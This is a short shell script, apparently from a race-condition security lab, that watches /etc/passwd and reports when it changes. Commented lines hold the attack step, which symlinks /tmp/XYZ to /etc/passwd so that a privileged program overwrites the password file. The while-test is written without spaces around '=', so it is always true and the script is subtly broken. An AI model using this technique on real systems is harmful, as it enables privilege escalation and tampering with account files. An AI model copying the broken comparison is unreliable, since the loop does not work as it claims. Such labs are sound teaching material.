#!/bin/sh

old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`
while [ "$old"="$new" ]
do
#rm -f /tmp/XYZ
#>/tmp/XYZ
#ln -sf /etc/passwd /tmp/XYZ
new=`ls -l /etc/passwd`
done

echo "Stop... The passwd has been changed!"
